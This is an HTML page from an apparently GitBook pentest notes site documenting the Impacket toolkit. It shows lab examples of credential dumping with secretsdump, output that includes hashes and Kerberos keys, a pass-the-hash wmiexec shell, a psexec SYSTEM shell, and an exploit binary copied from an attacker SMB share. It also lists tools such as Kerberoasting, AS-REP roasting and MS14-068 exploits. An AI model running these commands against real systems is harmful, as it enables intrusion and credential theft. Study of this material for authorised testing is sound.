+        <li class="chapter " data-level="2.9.11" data-path="unlock-applocker.html">
+            
+                <a href="unlock-applocker.html">
+            
+                    
+                    Unlock applocker
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.12" data-path="enum4linux.html">
+            
+                <a href="enum4linux.html">
+            
+                    
+                    enum4linux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.13" data-path="bloodhound/">
+            
+                <a href="bloodhound/">
+            
+                    
+                    Bloodhound
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.9.13.1" data-path="bloodhound/aclpwn.html">
+            
+                <a href="bloodhound/aclpwn.html">
+            
+                    
+                    aclpwn
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.14" data-path="mitm6.html">
+            
+                <a href="mitm6.html">
+            
+                    
+                    mitm6
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.15" data-path="enyx.html">
+            
+                <a href="enyx.html">
+            
+                    
+                    Enyx
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.16" data-path="nfsshell.html">
+            
+                <a href="nfsshell.html">
+            
+                    
+                    nfsshell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.17" data-path="powerupsql.html">
+            
+                <a href="powerupsql.html">
+            
+                    
+                    PowerUpSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.18" data-path="metasploit/">
+            
+                <a href="metasploit/">
+            
+                    
+                    Metasploit
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.9.18.1" data-path="metasploit/msfvenom.html">
+            
+                <a href="metasploit/msfvenom.html">
+            
+                    
+                    msfvenom
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.10" data-path="../others.html">
+            
+                <a href="../others.html">
+            
+                    
+                    Others
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >Impacket</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="impacket">Impacket</h1>
+<p>@<a href="https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/" target="_blank">https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/</a> </p>
+<h2 id="info">Info</h2>
+<p>Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. </p>
+<p>Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library. </p>
+<p>The following protocols are featured in Impacket </p>
+<ul>
+<li>Ethernet, Linux &quot;Cooked&quot; capture. </li>
+<li>IP, TCP, UDP, ICMP, IGMP, ARP. </li>
+<li>IPv4 and IPv6 Support. </li>
+<li>NMB and SMB1, SMB2 and SMB3 (high-level implementations). </li>
+<li>MSRPC version 5, over different transports: TCP, SMB/TCP, SMB/NetBIOS and HTTP. </li>
+<li>Plain, NTLM and Kerberos authentications, using password/hashes/tickets/keys. </li>
+<li>Portions/full implementation of the following MSRPC interfaces: EPM, DTYPES, LSAD, LSAT, NRPC, RRP, SAMR, SRVS, WKST, SCMR, DCOM, WMI </li>
+<li>Portions of TDS (MSSQL) and LDAP protocol implementations. </li>
+</ul>
+<h2 id="examples-for-scripts">Examples for scripts</h2>
+<h3 id="mssqlclient">mssqlclient</h3>
+<p>An MSSQL client, supporting SQL and Windows Authentications (hashes too). It also supports TLS.</p>
+<p>connect with mssqlclient.py. I&#x2019;ll make sure to use the -windows-auth flag</p>
+<pre><code class="lang-text">
+root@kali# mssqlclient.py reporting:&apos;PASSWORD&apos;@10.10.10.125 -windows-auth 
+Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation 
+
+
+[*] Encryption required, switching to TLS 
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume 
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english 
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 
+[*] INFO(QUERIER): Line 1: Changed database context to &apos;volume&apos;. 
+[*] INFO(QUERIER): Line 1: Changed language setting to us_english. 
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands 
+SQL&gt;
+</code></pre>
+<h3 id="getusersspns">GetUsersSPNs</h3>
+<p>This example will try to find and fetch Service Principal Names that are associated with normal user accounts. Output is compatible with JtR and HashCat. </p>
+<p>Get hashes: </p>
+<p><code>GetUserSPNs.py -request -save -dc-ip &lt;IP&gt; domain/user</code> </p>
+<h3 id="smbserver">SMBServer</h3>
+<p>A generic SMB client that will let you list shares and files, rename, upload and download files and create and delete directories, all using either username and password or username and hashes combination. It&apos;s an excellent example to see how to use impacket.smb in action. </p>
+<p>To get the server up and running on our local box, simple enter the following syntax: </p>
+<p>Starting the Server: </p>
+<p>/usr/bin/impacket-smbserver.py shareName sharePath {USE USERNAME and PASSWORD} </p>
+<ul>
+<li>shareName - can be anything you want, but you&#x2019;ll need to know this in order to connect back to the share </li>
+<li>sharePath - the folder you want shared </li>
+</ul>
+<p>Using username and password smb smbv2: </p>
+<pre><code class="lang-text">smbserver.py -smb2support share . -username df -password df
+</code></pre>
+<p>Example: </p>
+<pre><code class="lang-text">root@kali:~/pwk# impacket-smbserver smb tools/ 
+Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies 
+[*] Config file parsed 
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
+[*] Config file parsed 
+[*] Config file parsed 
+[*] Config file parsed 
+Connect to the server: 
+C:\&gt;net use 
+\\10.11.0.XXX\smb
+
+net use 
+\\10.11.0.XXX\smb
+
+The command completed successfully.
+</code></pre>
+<h4 id="copy-files">Copy files:</h4>
+<pre><code class="lang-text">C:\WINDOWS\Temp&gt;copy \\10.11.0.XXX\smb\ms11-046.exe \windows\temp\a.exe 
+copy \\10.11.0.XXX\smb\ms11-046.exe \windows\temp\a.exe 
+        1 file(s) copied.
+</code></pre>
+<h3 id="secretsdump">secretsdump</h3>
+<p>Performs various techniques to dump secrets from the remote machine without executing any agent there. For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry and then we save the hives in the target system (%SYSTEMROOT%\Temp directory) and read the rest of the data from there. For DIT files, we dump NTLM hashes, Plaintext credentials (if available) and Kerberos keys using the DL_DRSGetNCChanges() method. It can also dump NTDS.dit via vssadmin executed with the smbexec/wmiexec approach. The script initiates the services required for its working if they are not available (e.g. Remote Registry, even if it is disabled). After the work is done, things are restored to the original state.</p>
+<pre><code class="lang-text">root@kali# secretsdump.py -just-dc mrlky:Football#7@10.10.10.103 
+Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation             
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) 
+[*] Using the DRSUAPI method to get NTDS.DIT secrets 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267::: 
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8::: 
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
+amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3::: 
+mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef::: 
+sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de::: 
+SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:a571008b8559fc7e6abb364efa15312c::: 
+[*] Kerberos keys grabbed                                                    
+Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d 
+Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3 
+Administrator:des-cbc-md5:ad7afb706715e964                                    
+krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e 
+krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699 
+krbtgt:des-cbc-md5:866db35eb9ec5173 
+amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb 
+amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061 
+amanda:des-cbc-md5:70ba677a4c1a2adf 
+mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155 
+mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0 
+mrlky:des-cbc-md5:02f1a4da0432f7f7 
+sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d 
+sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955 
+sizzler:des-cbc-md5:5d51d30e68d092d9 
+SIZZLE$:aes256-cts-hmac-sha1-96:037a6a1bb47867be060491ddc54ff4bdf8057e1713dc3e2dd9a88cd5305384f4 
+SIZZLE$:aes128-cts-hmac-sha1-96:f7e839c51376067067d425a3baba2693 
+SIZZLE$:des-cbc-md5:3210b6852a4a2ae9 
+[*] Cleaning up...
+</code></pre>
+<h3 id="wmiexec">wmiexec</h3>
+<p>A semi-interactive shell, used through Windows Management Instrumentation. It does not require to install any service/agent at the target server. Runs as Administrator. Highly stealthy.</p>
+<p><strong>Example:</strong></p>
+<pre><code class="lang-text">root@kali:/opt/impacket# wmiexec.py -hashes :f6b7160bfc91823792e0ac3a162c9267 administrator@10.10.10.103 
+Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation 
+
+[*] SMBv3.0 dialect used 
+[!] Launching semi-interactive shell - Careful what you execute 
+[!] Press help for extra shell commands 
+C:\&gt;whoami 
+htb\administrator
+</code></pre>
+<h3 id="psexec">psexec</h3>
+<p>PSEXEC like functionality example using RemComSvc(<a href="https://github.com/kavika13/RemCom\" target="_blank">https://github.com/kavika13/RemCom\</a>). </p>
+<p>Example </p>
+<pre><code class="lang-text">root@kali:~/hackthebox/active-10.10.10.100# psexec.py active.htb/administrator@10.10.10.100 
+Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies 
+Password: 
+[*] Requesting shares on 10.10.10.100..... 
+[*] Found writable share ADMIN$ 
+[*] Uploading file dMCaaHzA.exe 
+[*] Opening SVCManager on 10.10.10.100..... 
+[*] Creating service aYMa on 10.10.10.100..... 
+[*] Starting service aYMa..... 
+[!] Press help for extra shell commands 
+Microsoft Windows [Version 6.1.7601] 
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved. 
+C:\Windows\system32&gt;whoami 
+nt authority\system
+</code></pre>
+<h3 id="lookupsid">lookupsid</h3>
+<pre><code class="lang-text">PS C:\Users\Jack\Downloads\impacket-examples-windows-master&gt; .\lookupsid.exe ETH/Jack:Password@192.168.211.128        
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies 
+
+[*] Brute forcing SIDs at 192.168.211.128 
+*] StringBinding ncacn_np:192.168.211.128[\pipe\lsarpc] 
+[*] Domain SID is: S-1-5-21-XXXXX-2199257571-2188946577 
+498: ETH\Enterprise Read-only Domain Controllers (SidTypeGroup) 
+00: ETH\Administrator (SidTypeUser) 
+501: ETH\Guest (SidTypeUser) 
+502: ETH\krbtgt (SidTypeUser) 
+512: ETH\Domain Admins (SidTypeGroup) 
+513: ETH\Domain Users (SidTypeGroup) 
+514: ETH\Domain Guests (SidTypeGroup) 
+515: ETH\Domain Computers (SidTypeGroup) 
+16: ETH\Domain Controllers (SidTypeGroup) 
+517: ETH\Cert Publishers (SidTypeAlias) 
+518: ETH\Schema Admins (SidTypeGroup) 
+519: ETH\Enterprise Admins (SidTypeGroup) 
+520: ETH\Group Policy Creator Owners (SidTypeGroup) 
+521: ETH\Read-only Domain Controllers (SidTypeGroup) 
+522: ETH\Cloneable Domain Controllers (SidTypeGroup) 
+525: ETH\Protected Users (SidTypeGroup) 
+526: ETH\Key Admins (SidTypeGroup) 
+527: ETH\Enterprise Key Admins (SidTypeGroup) 
+553: ETH\RAS and IAS Servers (SidTypeAlias) 
+571: ETH\Allowed RODC Password Replication Group (SidTypeAlias) 
+572: ETH\Denied RODC Password Replication Group (SidTypeAlias) 
+1000: ETH\WIN-EU4DLP9KRRC$ (SidTypeUser) 
+1101: ETH\DnsAdmins (SidTypeAlias) 
+1102: ETH\DnsUpdateProxy (SidTypeGroup) 
+1103: ETH\DESKTOP-OOBOA3U$ (SidTypeUser) 
+1104: ETH\Jack (SidTypeUser) 
+1105: ETH\Bob (SidTypeUser) 
+1106: ETH\SVC_SQLServices (SidTypeUser) 
+1107: ETH\Message Capture Users (SidTypeAlias)
+</code></pre>
+<h3 id="getnpusers">GetNPUsers</h3>
+<p> <code>AS-REP</code> roasting is an attack that is often-overlooked in my opinion it is not extremely common as you have to explicitly set <code>Accounts Does not Require Pre-Authentication</code> aka <code>DONT_REQ_PREAUTH</code></p>
+<pre><code class="lang-text">root@kali# GetNPUsers.py &apos;EGOTISTICAL-BANK.LOCAL/&apos; -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
+</code></pre>
+<h2 id="full-list-of-tools-that-featured-in-impacket">Full list of tools that featured in Impacket</h2>
+<h3 id="remote-execution">Remote Execution</h3>
+<ul>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/psexec.py" target="_blank">psexec.py:</a>&#x202F;PSEXEC like functionality example using RemComSvc(<a href="https://github.com/kavika13/RemCom" target="_blank">https://github.com/kavika13/RemCom</a>). </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/smbexec.py" target="_blank">smbexec.py:</a>&#x202F;A similar approach to PSEXEC w/o using RemComSvc. The technique is described&#x202F;<a href="https://web.archive.org/web/20140625065218/http:/blog.accuvant.com/rdavisaccuvant/owning-computers-without-shell-access/" target="_blank">here</a>. Our implementation goes one step further, instantiating a local smbserver to receive the output of the commands. This is useful in the situation where the target machine does NOT have a writeable share available. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/atexec.py" target="_blank">atexec.py:</a>&#x202F;This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/wmiexec.py" target="_blank">wmiexec.py:</a>&#x202F;A semi-interactive shell, used through Windows Management Instrumentation. It does not require to install any service/agent at the target server. Runs as Administrator. Highly stealthy. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/dcomexec.py" target="_blank">dcomexec.py:</a>&#x202F;A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects. </li>
+</ul>
+<h3 id="kerberos">Kerberos</h3>
+<ul>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/getTGT.py" target="_blank">GetTGT.py:</a>&#x202F;Given a password, hash or aesKey, this script will request a TGT and save it as ccache. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/getST.py" target="_blank">GetST.py:</a>&#x202F;Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate switch to request the ticket on behalf another user. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/getPac.py" target="_blank">GetPac.py:</a>&#x202F;This script will get the PAC (Privilege Attribute Certificate) structure of the specified target user just having a normal authenticated user credentials. It does so by using a mix of [MS-SFU]&apos;s S4USelf + User to User Kerberos Authentication. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/GetUserSPNs.py" target="_blank">GetUserSPNs.py:</a>&#x202F;This example will try to find and fetch Service Principal Names that are associated with normal user accounts. Output is compatible with JtR and HashCat. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/GetNPUsers.py" target="_blank">GetNPUsers.py:</a>&#x202F;This example will attempt to list and get TGTs for those users that have the property &apos;Do not require Kerberos preauthentication&apos; set (UF_DONT_REQUIRE_PREAUTH). Output is compatible with JtR. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/ticketer.py" target="_blank">ticketer.py:</a>&#x202F;This script will create Golden/Silver tickets from scratch or based on a template (legally requested from the KDC) allowing you to customize some of the parameters set inside the PAC_LOGON_INFO structure, in particular the groups, ExtraSids, duration, etc. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/raiseChild.py" target="_blank">raiseChild.py:</a>&#x202F;This script implements a child-domain to forest privilege escalation by (ab)using the concept of Golden Tickets and ExtraSids. </li>
+</ul>
+<h3 id="windows-secrets">Windows Secrets</h3>
+<ul>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/secretsdump.py" target="_blank">secretsdump.py:</a>&#x202F;Performs various techniques to dump secrets from the remote machine without executing any agent there. For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry and then we save the hives in the target system (%SYSTEMROOT%\Temp directory) and read the rest of the data from there. For DIT files, we dump NTLM hashes, Plaintext credentials (if available) and Kerberos keys using the DL_DRSGetNCChanges() method. It can also dump NTDS.dit via vssadmin executed with the smbexec/wmiexec approach. The script initiates the services required for its working if they are not available (e.g. Remote Registry, even if it is disabled). After the work is done, things are restored to the original state. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/mimikatz.py" target="_blank">mimikatz.py:</a>&#x202F;Mini shell to control a remote mimikatz RPC server developed by @gentilkiwi. </li>
+</ul>
+<h3 id="server-toolsmitm-attacks">Server Tools/MiTM Attacks</h3>
+<ul>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/ntlmrelayx.py" target="_blank">ntlmrelayx.py:</a>&#x202F;This script performs NTLM Relay Attacks, setting an SMB and HTTP Server and relaying credentials to many different protocols (SMB, HTTP, MSSQL, LDAP, IMAP, POP3, etc.). The script can be used with predefined attacks that can be triggered when a connection is relayed (e.g. create a user through LDAP) or can be executed in SOCKS mode. In this mode, for every connection relayed, it will be available to be used later on multiple times through a SOCKS proxy. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/karmaSMB.py" target="_blank">karmaSMB.py:</a>&#x202F;A SMB Server that answers specific file contents regardless of the SMB share and pathname specified. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/smbserver.py" target="_blank">smbserver.py:</a>&#x202F;A Python implementation of an SMB server. Allows to quickly set up shares and user accounts. </li>
+</ul>
+<h3 id="wmi">WMI</h3>
+<ul>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/wmiquery.py" target="_blank">wmiquery.py:</a>&#x202F;It allows to issue WQL queries and get description of WMI objects at the target system (e.g. select name from win32_account). </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/wmipersist.py" target="_blank">wmipersist.py:</a>&#x202F;This script creates/removes a WMI Event Consumer/Filter and link between both to execute Visual Basic based on the WQL filter or timer specified. </li>
+</ul>
+<h3 id="known-vulnerabilities">Known Vulnerabilities</h3>
+<ul>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/goldenPac.py" target="_blank">goldenPac.py:</a>&#x202F;Exploit for MS14-068. Saves the golden ticket and also launches a PSEXEC session at the target. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/sambaPipe.py" target="_blank">sambaPipe.py:</a>&#x202F;This script will exploit CVE-2017-7494, uploading and executing the shared library specified by the user through the -so parameter. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/smbrelayx.py" target="_blank">smbrelayx.py:</a>&#x202F;Exploit for CVE-2015-0005 using a SMB Relay Attack. If the target system is enforcing signing and a machine account was provided, the module will try to gather the SMB session key through NETLOGON. </li>
+</ul>
+<h3 id="smbmsrpc">SMB/MSRPC</h3>
+<ul>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/smbclient.py" target="_blank">smbclient.py:</a>&#x202F;A generic SMB client that will let you list shares and files, rename, upload and download files and create and delete directories, all using either username and password or username and hashes combination. It&apos;s an excellent example to see how to use impacket.smb in action. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/getArch.py" target="_blank">getArch.py:</a>&#x202F;This script will connect against a target (or list of targets) machine/s and gather the OS architecture type installed by (ab)using a documented MSRPC feature. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/rpcdump.py" target="_blank">rpcdump.py:</a>&#x202F;This script will dump the list of RPC endpoints and string bindings registered at the target. It will also try to match them with a list of well known endpoints. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/ifmap.py" target="_blank">ifmap.py:</a>&#x202F;This script will bind to the target&apos;s MGMT interface to get a list of interface IDs. It will used that list on top of another list of interface UUIDs seen in the wild trying to bind to each interface and reports whether the interface is listed and/or listening. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/opdump.py" target="_blank">opdump.py:</a>&#x202F;This binds to the given hostname:port and MSRPC interface. Then, it tries to call each of the first 256 operation numbers in turn and reports the outcome of each call. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/samrdump.py" target="_blank">samrdump.py:</a>&#x202F;An application that communicates with the Security Account Manager Remote interface from the MSRPC suite. It lists system user accounts, available resource shares and other sensitive information exported through this service. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/services.py" target="_blank">services.py:</a>&#x202F;This script can be used to manipulate Windows services through the [MS-SCMR] MSRPC Interface. It supports start, stop, delete, status, config, list, create and change. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/netview.py" target="_blank">netview.py:</a>&#x202F;Gets a list of the sessions opened at the remote hosts and keep track of them looping over the hosts found and keeping track of who logged in/out from remote servers </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/reg.py" target="_blank">reg.py:</a>&#x202F;Remote registry manipulation tool through the [MS-RRP] MSRPC Interface. The idea is to provide similar functionality as the REG.EXE Windows utility. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/lookupsid.py" target="_blank">lookupsid.py:</a>&#x202F;A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface, aiming at finding remote users/groups. </li>
+</ul>
+<h3 id="mssql--tds">MSSQL / TDS</h3>
+<ul>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/mssqlinstance.py" target="_blank">mssqlinstance.py:</a>&#x202F;Retrieves the MSSQL instances names from the target host. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/mssqlclient.py" target="_blank">mssqlclient.py:</a>&#x202F;An MSSQL client, supporting SQL and Windows Authentications (hashes too). It also supports TLS. </li>
+</ul>
+<h3 id="file-formats">File Formats</h3>
+<ul>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/esentutl.py" target="_blank">esentutl.py:</a>&#x202F;An Extensibe Storage Engine format implementation. Allows dumping catalog, pages and tables of ESE databases (e.g. NTDS.dit) </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/ntfs-read.py" target="_blank">ntfs-read.py:</a>&#x202F;NTFS format implementation. This script provides a mini shell for browsing and extracting an NTFS volume, including hidden/locked contents. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/registry-read.py" target="_blank">registry-read.py:</a>&#x202F;A Windwows Registry file format implementation. It allows to parse offline registry hives. </li>
+</ul>
+<h3 id="other">Other</h3>
+<ul>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/GetADUsers.py" target="_blank">GetADUsers.py:</a>&#x202F;This script will gather data about the domain&apos;s users and their corresponding email addresses. It will also include some extra information about last logon and last password set attributes. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/mqtt_check.py" target="_blank">mqtt_check.py:</a>&#x202F;Simple MQTT example aimed at playing with different login options. Can be converted into a account/password brute forcer quite easily. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/rdp_check.py" target="_blank">rdp_check.py:</a>&#x202F;[MS-RDPBCGR] and [MS-CREDSSP] partial implementation just to reach CredSSP auth. This example test whether an account is valid on the target host. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/sniff.py" target="_blank">sniff.py:</a>&#x202F;Simple packet sniffer that uses the pcapy library to listen for packets in # transit over the specified interface. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/sniffer.py" target="_blank">sniffer.py:</a>&#x202F;Simple packet sniffer that uses a raw socket to listen for packets in transit corresponding to the specified protocols. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/ping.py" target="_blank">ping.py:</a>&#x202F;Simple ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host. If the remote host is up, it should reply to the echo probe with an echo-reply packet. </li>
+<li><a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_20/examples/ping6.py" target="_blank">ping6.py:</a>&#x202F;Simple IPv6 ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host. </li>
+</ul>
+<h2 id=""> </h2>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="msbuildapicaller.html" class="navigation navigation-prev " aria-label="Previous page: MSBuildAPICaller">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="sharppersist.html" class="navigation navigation-next " aria-label="Next page: SharpPersist">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Impacket","level":"2.9.5","depth":2,"next":{"title":"SharpPersist","level":"2.9.6","depth":2,"path":"infrastructure-testing/tools/sharppersist.md","ref":"infrastructure-testing/tools/sharppersist.md","articles":[]},"previous":{"title":"MSBuildAPICaller","level":"2.9.4","depth":2,"path":"infrastructure-testing/tools/msbuildapicaller.md","ref":"infrastructure-testing/tools/msbuildapicaller.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"infrastructure-testing/tools/impacket.md","mtime":"2020-10-31T15:57:48.745Z","type":"markdown"},"gitb